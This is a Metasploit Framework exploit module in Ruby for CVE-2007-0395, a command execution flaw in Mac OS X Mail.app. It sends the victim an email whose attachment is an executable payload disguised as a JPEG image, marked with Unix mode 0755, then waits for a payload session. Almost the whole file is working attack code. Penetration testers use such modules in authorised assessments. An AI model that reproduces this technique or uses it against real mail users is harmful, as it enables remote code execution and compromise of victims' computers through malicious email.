##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##


require 'msf/core'

module Msf

class Exploits::Osx::Email::MailAppImageExec < Msf::Exploit::Remote

	#
	# This module sends email messages via smtp
	#
	include Exploit::Remote::SMTPDeliver

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Mail.app Image Attachment Command Execution',
			'Description'    => %q{
				This module exploits a command execution vulnerability in the
			Mail.app application shipped with Mac OS X 10.5.0. This flaw was 
			patched in 10.4 in March of 2007, but reintroduced into the final
			release of 10.5.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>  ['hdm', 'Kevin Finisterre <kf[at]digitalmunition.com>'],
			'Version'        => '$Revision$',
			'References'     => 
				[
	  				['CVE', '2007-0395'],
					['BID', '26510'],
					['BID', '16907']
				],
			'Stance'         => Msf::Exploit::Stance::Passive,
			'Payload'        =>
				{
					'Space'       => 8192,
					'DisableNops' => true,
					'BadChars'    => "",
					'Compat'      => 
						{
							'ConnectionType' => '-bind -find',
						},
				},
			'Platform'       => 'unix',
			'Arch'           => ARCH_CMD,
			'Targets'        =>
				[
					[ 'Mail.app All Versions',  { } ],													
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Mar 01 2006'
			))
			
			register_options(
				[
					OptString.new('MAILSUBJECT', [false, "The subject of the sent email"])
				], self.class)				
	end

	def autofilter
		false
	end

	def exploit
		
		exts = ['jpg']
		
		gext = exts[rand(exts.length)]
		name = rand_text_alpha(rand(10)+1) + ".#{gext}"
		data = rand_text_alpha(rand(32)+1)
		
		msg = Rex::MIME::Message.new
		msg.mime_defaults
		msg.subject = datastore['MAILSUBJECT'] || Rex::Text.rand_text_alpha(rand(32)+1)
		msg.to = datastore['MAILTO']
		msg.from = datastore['MAILFROM']

		msg.add_part(Rex::Text.encode_base64(data, "\r\n"), "text/plain", "base64", "inline")
		
		msg.add_part(Rex::Text.encode_base64(payload.encoded, "\r\n"),
			"image/jpeg; x-unix-mode=0755; name=\"#{name}\"",
			"base64",
			"inline; filename=\"#{name}\""
		)
		
		send_message(msg.to_s)		
		
		print_status("Waiting for a payload session (backgrounding)...")
	end
	
end
end
